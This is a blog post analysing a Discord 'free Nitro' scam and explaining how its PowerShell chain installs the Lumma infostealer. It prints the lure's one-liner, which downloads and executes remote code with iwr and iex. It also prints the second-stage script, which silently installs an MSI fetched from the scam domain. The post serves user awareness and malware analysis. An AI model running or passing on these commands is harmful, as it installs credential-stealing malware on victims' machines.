---
title: 'Analysis of a Discord Nitro Scam'
date: 2025-08-05
description: "Analyzing and dissecting a Discord Nitro Scam and understanding how its malware installer works"
author: 'ABUCKY0'
banner: /blog/analysis-of-a-discord-nitro-scam.png
unlisted: false
tags: ["discord", "nitro", "scam", "analysis", "malware"]
---
## Introduction
I'd like to start this out by saying that this is not a guide on how to run the scam, but rather an analysis of how it works and why you should never run it. Please do not attack anyone sending this scam, it's likely they themselves were scammed into running this one or another scam and are not aware of the consequences of running it.

> [!WARNING]
> The code snippets below are malicious. **Do not run them**. I do not control the domain and the infostealer this scam downloads can and will still steal your information.

> [!NOTE]
> The domain referenced below is offline as of writing this blog post, however it's still not recommended to run the scripts below in the case that it is reenabled.
## The Scam Message
I first encountered this scam on Discord in a server I moderate. The scammer sent a message with the following text:
```md
Hey, someone in a private server just shared
this Nitro method.
Apparently you can activate free Nitro by
running this in CMD:

`​powershell -command "if (($Mode = 'app') -and ($ActivateNitro = 'nitro' + 'features.' + $Mode + '/dev')) { $chart = iwr $ActivateNitro -UseBasicParsing; iex $chart.Content }" ​`

I haven't tested it myself yet, but a few people
said it worked for them.
Thought I'd send it to you before it gets
removed or patched.
```

You need a bit of knowlege with powershell to notice anything weird about this. The first thing a seasoned programmer might notice is that in the if statement comparison, it uses only one equal sign. `if (($Mode = 'app')` isn't checking if `$Mode` is equal to `'app'`, it's setting $Mode to app. Powershell comparison operators are like `-eq` for equal, `-ne` for not equal, and similar. You can see all of them on [https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.core/about/about_operators?view=powershell-7.5#assignment-operators](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.core/about/about_operators?view=powershell-7.5#assignment-operators).

The second portion of that if statement is doing the same thing. `$ActivateNitro` is being set to `'nitro' + 'features.' + 'app' + '/dev'`. The `-and` in the middle is truthy, meaning it always evaluates to `true`.

`iwr` or `Invoke-WebRequest` is downloading the contents of nitrofeatures|.app/dev. Then `iex` or `Invoke-Expression` executes it's input as a powershell command.

So the whole if statement is doing is:
- Setting `$Mode` to "app"
- Setting `$ActivateNitro` to nitrofeatures|.app/dev (vertical bar added to prevent a link being made)
- Downloading the contents of nitrofeatures|.app/dev into a variable in memory.
- Executing the downloaded powershell script. 


# The Hosted Powershell Script
This one is a bit more straightforward and obvious. Certain portions have been commented out and edited to prevent link embedding.

```powershell
$targetDir = "$env:APPDATA\Svservices"
if (-not (Test-Path $targetDir)) {
    New-Item -ItemType Directory -Path $targetDir -Force | Out-Null
}
$filename = "new2.msi"
$url = #"[https://]nitrofeatures[.]app/$fileName"
$fullPath = "$targetDir\$fileName"

Invoke-WebRequest $url -OutFile $fullPath

Push-Location $targetDir
Start-Process "msiexec.exe" -ArgumentList "/i `"$fullPath`" /qn /norestart" -Wait
Pop-Location

Write-Host "Access to Nitro functionality is temporarily paused due to load. Please try again in 48 hours." -ForegroundColor Yellow
```

I'll quickly go line by line below:

- `$targetDir = "$env:APPDATA\Svservices"` - Creates a variable that holds the name of the directory that the malware is downloaded to.
- ```ps1
  if (-not (Test-Path $targetDir)) {
      New-Item -ItemType Directory -Path $targetDir -Force | Out-Null
  }
  ```
  Checks if the Svservices folder has already been created. If it hasn't, create it. Pipe all output to the void (Out-Null doesn't print it to console).
- ```ps1
  $filename = "new2.msi"
  $url = https://nitrofeatures[.]app/$fileName"
  $fullPath = "$targetDir\$fileName"
  ```
  `$filename` stores the name of the malicious msi file. `$url` stores the download url for the msi file. `$fullPath` stores the download path for the msi executable.
- ```ps1
  Invoke-WebRequest $url -OutFile $fullPath
  ```
  Downloads the msi executable to the Svservices folder. 

- Now the next three lines are the interesting ones. Up until I encountered this malware, I had never seen `Push-Location` and `Pop-Location`. Basically these work as a stack. You push the new location onto the stack (In this case the malware's storage directory), which then changes your current working directory to the one you pushed. 
  ```ps1
  Push-Location $targetDir
  Start-Process "msiexec.exe" -ArgumentList "/i `"$fullPath`" /qn /norestart" -Wait
  Pop-Location
  ```
  `msiexec.exe` installs MSI files. Basically the msiexec command is installing the malware, without a gui or text output, and then doesn't restart the computer.  
  `Pop-Location` returns the current working directory back to the place it was when you opened the Powershell window.
- And then of course, last but not least, it tells the user that their 'free nitro' couldn't be setup since there's no actual free nitro being done. 
  ```ps1
  Write-Host "Access to Nitro functionality is temporarily paused due to load. Please try again in 48 hours." -ForegroundColor Yellow
  ```

# The malware itself
During analyzing the above, I used a https://tria.ge vm. You can read the full report on [https://tria.ge/250805-vmsmlsyjw6/behavioral2](https://tria.ge/250805-vmsmlsyjw6/behavioral2), but tl;dr it's an infostealer. More specifically, it's a Lumma infostealer. According to triage, it tried to look at local email clients, indexed installed software on teh system, and looked to see if there were any other drives. I presume it can also steal discord tokens and such which allows this malware to spread. 


